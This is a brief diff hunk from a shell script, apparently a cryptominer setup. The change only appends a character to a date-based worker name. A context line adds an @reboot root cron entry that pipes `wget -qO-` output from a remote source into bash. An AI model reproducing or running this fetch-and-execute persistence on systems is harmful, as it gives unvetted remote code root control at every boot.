@@ -5,7 +5,7 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/...) >>/d
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$name" ] || name="NULL"
-name="${name}"
+name="${name}x"
 
 cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
